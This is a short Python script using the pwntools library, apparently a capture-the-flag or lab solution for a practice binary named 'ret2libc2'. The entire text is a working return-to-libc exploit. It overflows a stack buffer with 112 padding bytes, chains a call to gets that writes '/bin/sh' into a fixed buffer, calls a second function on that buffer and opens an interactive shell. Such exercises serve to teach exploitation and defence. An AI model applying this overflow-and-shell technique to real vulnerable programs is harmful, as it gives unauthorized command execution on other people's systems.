from pwn import *

pro=process('./ret2libc2')
buf=0x0804A080
syscall=0x08048490
gets=0x08048460

payload='A'*112+p32(gets)+p32(syscall)+p32(buf)+p32(buf)
pro.sendline(payload)
pro.sendline('/bin/sh')

pro.interactive()
